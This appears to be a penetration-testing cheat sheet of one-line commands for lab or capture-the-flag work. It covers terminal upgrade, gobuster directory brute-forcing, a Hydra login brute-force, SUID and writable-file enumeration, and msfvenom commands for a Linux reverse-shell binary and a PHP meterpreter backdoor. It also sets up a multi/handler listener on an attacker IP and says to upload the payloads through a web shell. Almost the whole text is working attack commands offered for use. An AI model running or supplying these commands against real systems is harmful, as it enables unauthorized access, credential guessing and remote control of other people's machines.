`Upgrade terminal`
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
___
`Gobuster`
```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://ip -t 100 -q -o gobust.txt
```
___
`Hydra` `To Find Username OR Password for login pages` 
```
hydra -L .dic -p test IP http-post-form "log=^USER^&pwd=^PWD^:Invalid username Or name of Error thrown" -t 30
```

___
`To find Root Processes`
```
Sudo -l
```
OR
```
find / -perm +6000 2>/dev/null | grep '/bin/'
```
___
`Find Writable files / folders`
```
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
```
___
`MsfVenom`
```
In Attackers pc: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.49 LPORT=4040 -f elf > r.elf
Upload the r.elf to webshell and excuite it to get the reverse shell

OR

1. Generate backdoor

msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.32 LPORT=4444 -f raw -o payload.php

2. Create our payload handler

msfconsole
$ use exploit/multi/handler
$ set payload php/meterpreter/reverse_tcp
$ set LHOST 192.168.0.32
$ set LPORT 4444
$ run

3. Paste the payload.php in web shell to get the reverse shell
```



